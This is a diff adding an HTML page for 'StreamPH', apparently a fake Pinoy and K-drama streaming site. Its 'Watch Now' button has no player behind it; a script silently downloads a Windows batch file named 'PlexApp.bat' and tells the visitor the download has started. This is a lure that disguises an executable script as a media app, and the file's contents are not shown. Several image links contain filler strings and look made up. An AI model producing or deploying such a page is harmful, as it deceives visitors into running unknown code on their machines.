@@ -1,0 +1,262 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>StreamPH</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap"
+      rel="stylesheet"
+    />
+
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Inter", sans-serif;
+      }
+
+      body {
+        background-color: #141414;
+        color: white;
+      }
+
+      /* HEADER */
+      header {
+        position: fixed;
+        width: 100%;
+        top: 0;
+        left: 0;
+        padding: 15px 40px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        background: rgba(0, 0, 0, 0.85);
+        z-index: 1000;
+      }
+
+      .logo {
+        font-size: 24px;
+        font-weight: 700;
+        color: #fdbb2d;
+      }
+
+      nav a {
+        margin-left: 20px;
+        text-decoration: none;
+        color: white;
+        font-size: 14px;
+      }
+
+      /* HERO */
+      .hero {
+        height: 100vh;
+        background:
+          linear-gradient(to bottom, rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.9)),
+          url("https://image.tmdb.org/t/p/original/5BwqwxMEjeFtdknRV792Svo0K1v.jpg");
+        background-size: cover;
+        background-position: center;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        text-align: center;
+        padding: 20px;
+      }
+
+      .hero-content {
+        max-width: 700px;
+      }
+
+      .hero h1 {
+        font-size: 60px;
+        margin-bottom: 20px;
+      }
+
+      .hero p {
+        font-size: 20px;
+        margin-bottom: 35px;
+        color: #ddd;
+      }
+
+      .hero button {
+        padding: 20px 60px;
+        font-size: 22px;
+        font-weight: 700;
+        border: none;
+        border-radius: 8px;
+        background: #fdbb2d;
+        color: black;
+        cursor: pointer;
+        transition: 0.3s ease;
+      }
+
+      .hero button:hover {
+        background: #ffcc4d;
+        transform: scale(1.05);
+      }
+
+      /* SECTIONS */
+      .section {
+        padding: 60px 40px;
+      }
+
+      .section h2 {
+        margin-bottom: 25px;
+        font-size: 24px;
+      }
+
+      .row {
+        display: flex;
+        gap: 20px;
+        overflow-x: auto;
+      }
+
+      .movie-card {
+        min-width: 200px;
+        background: #1f1f1f;
+        border-radius: 10px;
+        overflow: hidden;
+        transition: 0.3s ease;
+      }
+
+      .movie-card img {
+        width: 100%;
+        height: 300px;
+        object-fit: cover;
+      }
+
+      .movie-card .title {
+        padding: 12px;
+        font-size: 14px;
+        text-align: center;
+      }
+
+      .movie-card:hover {
+        transform: scale(1.08);
+        background: #2a2a2a;
+      }
+
+      /* DOWNLOAD NOTIFICATION */
+      #toast {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        background: #fdbb2d;
+        color: black;
+        padding: 15px 25px;
+        border-radius: 8px;
+        font-weight: bold;
+        display: none;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+      }
+    </style>
+  </head>
+
+  <body>
+    <header>
+      <div class="logo">StreamPH</div>
+      <nav>
+        <a href="#">Home</a>
+        <a href="#pinoy">Pinoy</a>
+        <a href="#kdrama">K-Drama</a>
+      </nav>
+    </header>
+
+    <section class="hero">
+      <div class="hero-content">
+        <h1>Watch Pinoy & K-Drama Hits</h1>
+        <p>Stream your favorite Filipino movies anytime.</p>
+        <button onclick="downloadFile()">▶ Watch Now</button>
+      </div>
+    </section>
+
+    <!-- PINOY MOVIES -->
+    <section class="section" id="pinoy">
+      <h2>🇵🇭 Popular Pinoy Movies</h2>
+      <div class="row">
+        <div class="movie-card">
+          <img
+            src="https://image.tmdb.org/t/p/w500/6bxx0uQzG8Zgk5x6rB6VQ2J8kTn.jpg"
+          />
+          <div class="title">Hello, Love, Goodbye</div>
+        </div>
+
+        <div class="movie-card">
+          <img
+            src="https://image.tmdb.org/t/p/w500/lx6g0JXvVj5vKz7LxyzXYZ123.jpg"
+          />
+          <div class="title">Seven Sundays</div>
+        </div>
+
+        <div class="movie-card">
+          <img
+            src="https://image.tmdb.org/t/p/w500/5BwqwxMEjeFtdknRV792Svo0K1v.jpg"
+          />
+          <div class="title">The Hows of Us</div>
+        </div>
+
+        <div class="movie-card">
+          <img
+            src="https://image.tmdb.org/t/p/w500/9O1Iy9od9oTiFqouBZfyqCkCmZL.jpg"
+          />
+          <div class="title">Four Sisters and a Wedding</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- K-DRAMA -->
+    <section class="section" id="kdrama">
+      <h2>🇰🇷 Trending K-Dramas</h2>
+      <div class="row">
+        <div class="movie-card">
+          <img
+            src="https://image.tmdb.org/t/p/w500/6Prm5jlf4SChx0d7v6X6rJ6jC1W.jpg"
+          />
+          <div class="title">Crash Landing on You</div>
+        </div>
+
+        <div class="movie-card">
+          <img
+            src="https://image.tmdb.org/t/p/w500/9gk7adHYeDvHkCSEqAvQNLV5Uge.jpg"
+          />
+          <div class="title">Goblin</div>
+        </div>
+
+        <div class="movie-card">
+          <img
+            src="https://image.tmdb.org/t/p/w500/qQy7p3k7FZ3nG5lBxyzXYZ456.jpg"
+          />
+          <div class="title">Descendants of the Sun</div>
+        </div>
+
+        <div class="movie-card">
+          <img
+            src="https://image.tmdb.org/t/p/w500/2bU0uC1V2c4p9RxyzXYZ789.jpg"
+          />
+          <div class="title">True Beauty</div>
+        </div>
+      </div>
+    </section>
+
+    <div id="toast">Download started! Check your Downloads folder.</div>
+
+    <script>
+      function downloadFile() {
+        const link = document.createElement("a");
+        link.href = "/files/PlexApp.bat";
+        link.download = "/files/PlexApp.bat";
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+
+        const toast = document.getElementById("toast");
+        toast.style.display = "block";
+
+        setTimeout(() => {
+          toast.style.display = "none";
+        }, 3000);
+      }
+    </script>
+  </body>
+</html>
